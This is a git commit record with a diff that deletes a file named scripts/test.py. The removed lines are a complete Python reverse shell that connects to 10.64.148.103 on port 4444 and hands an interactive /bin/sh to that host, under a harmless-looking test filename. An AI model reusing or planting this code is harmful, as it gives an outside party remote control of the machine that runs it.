1066eb77b8de20943c7096974a0ed0faad12ae79
Sujeeth-Namburi-vizio <sujeeth.namburi@vizio.com>
2025-04-16 10:49:18 -0500

    Delete scripts/test.py

--- scripts/test.py
+++
@@ -1,8 +0,0 @@
-#!/usr/bin/env python3
-import socket,subprocess,os
-s = socket.socket()
-s.connect(("10.64.148.103", 4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])
